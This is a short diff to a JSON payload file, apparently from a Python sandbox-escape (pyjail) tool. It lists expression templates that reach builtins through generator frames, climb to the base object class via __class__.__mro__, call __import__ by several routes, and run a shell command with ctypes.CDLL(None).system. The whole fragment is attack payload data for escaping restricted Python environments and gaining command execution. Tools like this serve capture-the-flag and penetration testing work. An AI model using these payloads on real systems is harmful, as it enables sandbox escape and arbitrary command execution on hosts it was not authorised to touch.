@@ -103,14 +103,15 @@
         ["GENERATOR.f_back.f_builtins", ""],
         ["GENERATOR.f_back.f_globals['__builtins__']", ""]
     ],
-    "get_object":[
+    "object":[
         ["BUILTINOBJ.__class__.__bases__[0]", ""],
         ["BUILTINOBJ.__class__.__mro__[-1]", ""],
         ["BUILTINOBJ.__class__.__mro__[1]", ""]
     ],
     "import_payloads":[
-        ["__import__(MOUDLE)", "__import__"],
-        ["import MOUDLE;", ""]
+        ["__import__", "__import__"],
+        ["BUILTINS_SET['__import__']", "BUILTINS_SET"],
+        ["MODULE_BUILTINS.__import__", "MODULE_BUILTINS"]
     ],
     "RCE_system_functions":[
         ["ctypes.CDLL(None).system(CMD.encode())", "ctypes"],
